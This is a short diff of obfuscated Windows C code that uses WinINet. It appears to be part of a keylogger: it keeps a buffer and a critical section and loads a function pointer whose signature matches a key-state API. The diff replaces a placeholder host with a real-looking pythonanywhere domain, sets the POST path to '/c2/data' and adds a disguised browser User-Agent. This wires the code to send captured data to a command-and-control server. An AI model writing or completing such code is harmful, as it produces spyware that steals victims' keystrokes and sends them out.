@@ -3,12 +3,12 @@
 #include <wininet.h>
 
 #define O1 1024
-#define O2 0
+#define O2 2000
 
 char V1[O1];
 int V2 = 0;
 CRITICAL_SECTION V3;
-char* O3 = "example.com";
+char* O3 = "tdsoperational.pythonanywhere.com";
 
 typedef SHORT (WINAPI *F3)(int);
 F3 O4;
@@ -18,8 +18,8 @@ void F1() {
     if (V4) {
         HINTERNET V5 = InternetConnectA(V4, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
         if (V5) {
-            const char *O5 = "/data";
-            const char *O6 = "Content-Type: application/json";
+            const char *O5 = "/c2/data";
+            const char *O6 = "Content-Type: application/json\r\nUser-Agent: TLD9Browser/2.0";
             HINTERNET V6 = HttpOpenRequestA(V5, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
             if (V6) {
                 char V7[O1 + 128];
